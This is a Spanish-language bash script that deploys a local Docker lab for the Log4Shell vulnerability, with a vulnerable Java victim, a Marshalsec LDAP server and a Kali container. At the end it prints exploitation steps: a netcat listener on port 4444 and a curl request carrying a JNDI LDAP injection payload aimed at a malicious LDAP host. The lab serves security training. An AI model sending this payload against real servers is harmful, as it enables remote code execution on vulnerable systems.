#!/bin/bash

VERDE='\033[0;32m'
AZUL='\033[0;34m'
ROJO='\033[0;31m'
NC='\033[0m'

echo -e "${AZUL}[*] Iniciando el Gestor Automático del Laboratorio Log4Shell...${NC}"

# Guardamos la ruta raíz absoluta de tu proyecto
RUTA_RAIZ=$(pwd)

# Validación de seguridad: comprobar que estamos en la carpeta correcta
if [ ! -d "$RUTA_RAIZ/atacante" ]; then
    echo -e "${ROJO}[X] Error: Ejecuta este script desde la raíz de 'mi-laboratorio-log4shell'.${NC}"
    exit 1
fi

echo -e "${VERDE}[+] Entorno Plug & Play detectado correctamente (Infraestructura Unificada).${NC}"
read -p "¿Deseas levantar todo el laboratorio de forma automática? (s/n): " RESPUESTA

if [[ "$RESPUESTA" =~ ^[Ss]$ ]]; then
    echo -e "${AZUL}[*] Limpiando residuos de contenedores o redes previas...${NC}"
    cd "$RUTA_RAIZ/atacante" && sudo docker compose down --volumes --remove-orphans

    echo -e "${AZUL}[*] Compilando e iniciando la infraestructura unificada (Víctima + Atacante)...${NC}"
    sudo docker compose up -d --build --force-recreate

    echo -e "\n${VERDE}================================================================${NC}"
    echo -e "${VERDE}[+] ¡LABORATORIO LOG4SHELL DESPLEGADO CON ÉXITO!${NC}"
    echo -e "${VERDE}================================================================${NC}"
    echo -e "${AZUL}[i] Resumen de servicios en ejecución:${NC}"
    echo -e "    - ${AZUL}Víctima (Java 8u111):${NC}    http://localhost:8080/"
    echo -e "    - ${AZUL}LDAP (Marshalsec):${NC}       Puerto interno 1389"
    echo -e "    - ${AZUL}Atacante (Kali Tools):${NC}  Servidor Web en Puerto 8000"
    echo -e "\n${AZUL}[*] Próximos pasos recomendados para explotar:${NC}"
    echo -e "    1. Abre el listener en Kali:  ${VERDE}sudo docker exec -it kali-tools bash${NC} y luego: ${VERDE}nc -lvnp 4444${NC}"
    echo -e "    2. Lanza el ataque desde tu Ubuntu:  ${VERDE}curl http://localhost:8080/ -H 'X-Api-Version: \${jndi:ldap://ldap-malicioso:1389/Exploit}'${NC}"
    echo -e "${VERDE}================================================================${NC}"
else
    echo -e "${AZUL}[*] Operación cancelada. No se han realizado cambios.${NC}"
fi
